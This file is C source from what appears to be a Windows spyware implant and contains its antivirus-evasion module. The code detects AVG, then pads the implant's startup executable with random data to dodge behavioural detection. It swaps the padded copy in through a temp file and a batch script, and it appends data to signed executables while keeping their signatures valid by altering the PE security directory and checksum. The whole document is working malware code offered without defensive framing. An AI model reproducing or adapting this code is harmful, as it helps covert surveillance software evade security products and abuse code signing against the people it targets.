/* methods required for specific invisibility issues */

#include <Windows.h>
#include <Shlwapi.h>

#include "invisibility.h"
#include "device.h"
#include "utils.h"
#include "zmem.h"

VOID AvgInvisibility()
{

	    /* 
		   Solves Avg General Behavior detection by increasing executable size in startup.
		   executable not run from startup is not affected by this detection:

			- a] current process is not running from startup -> don't do anything at the moment. soldier is expected to be running from startup only
			- b] current process is the scout running from startup -> drop a garbage file in %temp%, the a batch that 
																	  waits for current process to bail and then appends
																	  the garbage to scout executable in startup and spawns
																	  a 'fat' scout process
		*/
		    

		LPWSTR strDestPath = GetStartupScoutName();
		LPWSTR strSourcePath = GetMySelfName();
		LPWSTR strStartupPath = GetStartupPath();

		/* make avg scout fat */
		WCHAR szAvg[] = { L'A', L'V', L'G', 0x0 };
		PWCHAR pApplicationList = NULL;
		
		pApplicationList = GetAppList();
	
		
		if (StrStrI(pApplicationList, szAvg))
		{
			HANDLE hScout = CreateFile(strDestPath, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if(hScout == INVALID_HANDLE_VALUE)
			{
#ifdef _DEBUG
				OutputDebugString(L"Failed opening scout");
				OutputDebugString(strDestPath);
				OutputDebugString(L"\n");
#endif
				
			} else
			{
#ifdef _DEBUG
				OutputDebugString(L"Read handle opened ");
				OutputDebugString(strDestPath);
				OutputDebugString(L"\n");
#endif

				/*LARGE_INTEGER lM;
				lM.QuadPart =  1048576 + 10;
				LONGLONG lPadding = 0;
				LARGE_INTEGER lFileSize;
				GetFileSizeEx(hScout, &lFileSize);
				lPadding = lM.QuadPart - lFileSize.QuadPart;*/

				DWORD dwM = (1048576*4) + 10;
				DWORD dwPadding= 0;
				DWORD dwFileSize = GetFileSize(hScout, NULL);

				dwPadding = dwM - dwFileSize;

				/* padding must an 8 byte multiple */
				while( dwPadding % 8 != 0 )
					dwPadding += 1;
				

				if( dwPadding > 0 )
				{

					/* a] not running from startup, just expand scout file on startup */
					if( !AmIFromStartup() )  
					{
						/* don't do anything at the moment, since soldier is expected to be running from startup only */						
													
						
					} else 

					/*	b]	if soldier is running from startup and is not big enough (lPadding > 0)
							create an expanded kosher copy in temp and replace the one in startup 
							with a batch script
					*/
					{
						
						LPBYTE lpGarbagePadding = GetRandomData(dwPadding);
						LPBYTE lpFatExecutableBuffer = AppendDataInSignedExecutable(hScout, lpGarbagePadding, dwPadding, &dwFileSize);

						zfree(lpGarbagePadding);

						if( lpFatExecutableBuffer != NULL )
						{

							/* read only handle was needed by AppendDataInSignedExecutable */
							CloseHandle(hScout);

							LPWSTR lpTempFile = CreateTempFile();
							HANDLE hFatScout = CreateFile(lpTempFile, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

							if( hFatScout != INVALID_HANDLE_VALUE )
							{
								DWORD dwBytesWritten = 0;
								BOOL bGarbageFileWritten = WriteFile(hFatScout, lpFatExecutableBuffer, dwFileSize, &dwBytesWritten, NULL);
							
								CloseHandle(hFatScout);

#ifdef _DEBUG
								if(bGarbageFileWritten && dwBytesWritten == dwFileSize)
									OutputDebugString(L"Fat scout file written\n");
								else
									OutputDebugString(L"Issues writing fat scout file\n");
#endif

								/* Batch file increases scout size, then respawns a fat scout process */
								PWCHAR pBatchName;
								CreateFileReplacerBatch(lpTempFile, strDestPath, &pBatchName);
								StartBatch(pBatchName);
								ExitProcess(0);
							}
						} // if( lpFatExecutableBuffer != NULL )
					} // else
				} //if( dwPadding > 0 )
			}//else
		}
#ifdef _DEBUG
		else {
			OutputDebugString(L"No avg here");
		}
#endif
		
		/* free resources */
		zfree(pApplicationList);
		zfree(strDestPath);
		zfree(strSourcePath);
		zfree(strStartupPath);

}


/*	Append data to a signed executable without invalidating its signature.
	N.B. pad data must be 8 byte aligned 

	RETURNS a pointer to a buffer containing a fat signed executable, NULL otherwise
*/
LPBYTE AppendDataInSignedExecutable(LPWSTR lpTargetExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize)
{
	*dwFatExecutableSize = 0;

	/* read target executable content */
	HANDLE hExecutable = CreateFile(lpTargetExecutable, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if( hExecutable == INVALID_HANDLE_VALUE )
		return NULL;

	LPBYTE lpBuffer = AppendDataInSignedExecutable(hExecutable, lpPadData, dwPadDataSize, dwFatExecutableSize);

	CloseHandle(hExecutable);

	return lpBuffer;
}

LPBYTE AppendDataInSignedExecutable(HANDLE hExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize)
{
		
	DWORD dwExecutableSize = 0;
	dwExecutableSize = GetFileSize(hExecutable, NULL);
	LPBYTE lpExecutableBuffer = (LPBYTE) zalloc(dwExecutableSize);

	DWORD dwBytesRead = 0;

	if( !ReadFile(hExecutable, lpExecutableBuffer, dwExecutableSize, &dwBytesRead, NULL) )
	{
#ifdef _DEBUG
		OutputDebugString(L"Can't read file");
#endif
		return NULL;
	}
	
	

	/* optional_header -> data_directory -> image_directory_entry_security */

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) lpExecutableBuffer;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS) (lpExecutableBuffer + pDosHeader->e_lfanew);
	
	DWORD dwSecurityDirectoryRva =  0;
	DWORD dwSecurityDirectorySize =  0;
	
	dwSecurityDirectoryRva  = (DWORD)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress);  
	dwSecurityDirectorySize = (DWORD)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);  

	/* if file is not signed return */
	if( dwSecurityDirectoryRva == 0 )
	{
#ifdef _DEBUG
		OutputDebugString(L"No signature");
#endif
		return NULL;
	}

	/* pad data must be a 8 byte multiple */
	if( dwPadDataSize % 8 != 0 )
	{
#ifdef _DEBUG
		OutputDebugString(L"No pad");
#endif
		return NULL;
	}


	/* create a buffer to host the new executable */
	LPBYTE lpFatExecutableBuffer = (LPBYTE) zalloc(dwExecutableSize + dwPadDataSize);

	/* 
		fat executable creation:
		1] old executable + pad
		2] update security entry size
		3] update pe checksum
	*/

	/* 1] old executable + pad */
	memcpy(lpFatExecutableBuffer, lpExecutableBuffer, dwExecutableSize);
	memcpy(lpFatExecutableBuffer + dwExecutableSize, lpPadData, dwPadDataSize);

	/* 2] update security entry size */
	pNtHeaders = (PIMAGE_NT_HEADERS) (lpFatExecutableBuffer + pDosHeader->e_lfanew);
	LPDWORD lpSecuritySize = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);
	
	*lpSecuritySize = dwSecurityDirectorySize + dwPadDataSize;

	/* 3] update pe checksum */
	LPDWORD lpFatChecksum = &(pNtHeaders->OptionalHeader.CheckSum);
	DWORD dwNewFatChecksum = ComputePEChecksum(lpFatExecutableBuffer, dwExecutableSize + dwPadDataSize);
	
	if( dwNewFatChecksum == -1 )
	{
#ifdef _DEBUG
		OutputDebugString(L"Fail checksum");
#endif
		return NULL;
	}

	*lpFatChecksum = dwNewFatChecksum;


	/* cleanup */
	zfree(lpExecutableBuffer);


	*dwFatExecutableSize = dwExecutableSize + dwPadDataSize;
	return lpFatExecutableBuffer;
}


DWORD ComputePEChecksum(LPBYTE lpMz, DWORD dwBufferSize)
{
	HMODULE hImageHlp = LoadLibrary(L"Imagehlp.dll");
	if( hImageHlp == NULL )
		return -1;

	CHECKSUMMAPPEDFILE fpCheckSumMappedFile = (CHECKSUMMAPPEDFILE) GetProcAddress(hImageHlp, "CheckSumMappedFile");

	if( fpCheckSumMappedFile == NULL )
	{
		FreeLibrary(hImageHlp);
		return -1;
	}

	DWORD dwOriginalChecksum = 0;
	DWORD dwComputedChecksum = 0;
	fpCheckSumMappedFile(lpMz,dwBufferSize, &dwOriginalChecksum, &dwComputedChecksum);

	FreeLibrary(hImageHlp);

	return dwComputedChecksum;
}
